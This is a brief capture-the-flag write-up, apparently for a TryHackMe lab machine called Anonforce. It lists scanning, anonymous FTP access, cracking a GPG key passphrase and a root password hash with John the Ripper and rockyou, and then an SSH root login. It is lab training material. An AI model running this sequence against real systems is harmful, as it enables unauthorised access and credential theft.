# Anonforce

```Bash
rustscan -a 10.10.137.35
```
![image](https://github.com/lufffe/Writeups/assets/90646635/2eb52051-8d62-4057-a1eb-9be9889e0077)

![image](https://github.com/lufffe/Writeups/assets/90646635/f087c7a5-e1bf-4fb6-8b03-456f6de445da)


```Bash
nmap -A -p 21,22 10.10.137.35
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5481b171-505b-4098-a9b5-232cb3ae6a6b)


```Bash
ftp 10.10.137.35
```
![image](https://github.com/lufffe/Writeups/assets/90646635/593317a7-6ef8-46ff-847e-8caeb6f6cc36)


![image](https://github.com/lufffe/Writeups/assets/90646635/a3b72171-b83d-4166-a0b2-8c1935570708)

```Bash
cat user.txt
```
>#####################################

![image](https://github.com/lufffe/Writeups/assets/90646635/1e22fcd1-0ff8-4f5f-b6f0-e0e5f34d0730)

![image](https://github.com/lufffe/Writeups/assets/90646635/19810faa-c329-4c5c-93e9-8e7d790be8d4)

```Bash
/usr/sbin/gpg2john private.asc > hash
```


```Bash
john --wordlist=~/rockyou.txt hash   
```
- xbox360          (anonforce) 

```Bash
gpg --import private.asc
```

![image](https://github.com/lufffe/Writeups/assets/90646635/c289986d-2006-4fb8-b71e-72f54ad4ab11)

```Bash
john --wordlist=~/rockyou.txt root.hash
```

![image](https://github.com/lufffe/Writeups/assets/90646635/668176f3-4656-43c8-9c2e-5b1d04e974cc)

```
ssh root@10.10.137.35
```

![image](https://github.com/lufffe/Writeups/assets/90646635/4351685c-ce14-4f48-85c7-9ff6cd8bc031)
